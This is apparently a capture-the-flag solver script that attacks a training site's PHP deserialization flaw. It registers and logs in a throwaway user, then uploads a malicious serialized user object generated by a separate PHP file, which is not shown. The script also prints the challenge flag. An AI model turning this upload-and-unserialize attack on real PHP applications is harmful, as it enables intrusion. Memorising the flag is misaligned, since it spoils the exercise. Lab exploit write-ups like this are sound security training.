#!/usr/bin/env python3

# PHP serialization challenge
# Look to metactf.php for the malicious PHP serialized payload.

# flag{nice_yuo_got_the_unserialize_flag!}

import random
import string
import requests
import os


URL = "http://meta.training.jinblack.it"
found = False


def register(session, username, password):
    url = "%s/register.php" % URL
    payload = {
        "username": username,
        "password_1": password,
        "password_2": password,
        "reg_user": ""
    }
    r = session.post(url, data=payload)
    return r.text


def login(session, username, password):
    url = "%s/login.php" % URL
    payload = {"username": username, "password": password, "log_user": ""}
    r = session.post(url, data=payload)
    return r.text


def upload_user(session, user):
    url = "%s/upload_user.php" % URL
    files = {"user_bak": user}
    r = session.post(url, files=files)
    return r.text


def download_user(session):
    url = "%s/download_user.php" % URL
    r = session.get(url)
    return r.text


def logout(session):
    url = "%s/logout.php" % URL
    r = session.get(url)
    return r.text


def index(session):
    global found
    url = "%s/index.php" % URL
    r = session.get(url)
    if "flag" in r.text:
        print(r.text)
    return r.text


def random_string():
    k = random.randint(6, 10)
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))


session = requests.Session()
username = random_string()
password = random_string()

# Register a new user
res = register(session, username, password)
assert "Registration Completed!" in res

# Login with the new user
res = login(session, username, password)
assert "Login Completed!" in res

# Try downloading it
user = download_user(session)
assert len(user) > 0

# Check if uploading the user the downloaded version is the same
upload_user(session, user)
assert user == download_user(session)

# Generate malicious php serialization
malicious_user = os.popen("php ./metactf.php").read()
print(malicious_user)
assert len(malicious_user) > 0

# Upload malicious user, in the result there should be the flag
print(upload_user(session, malicious_user))
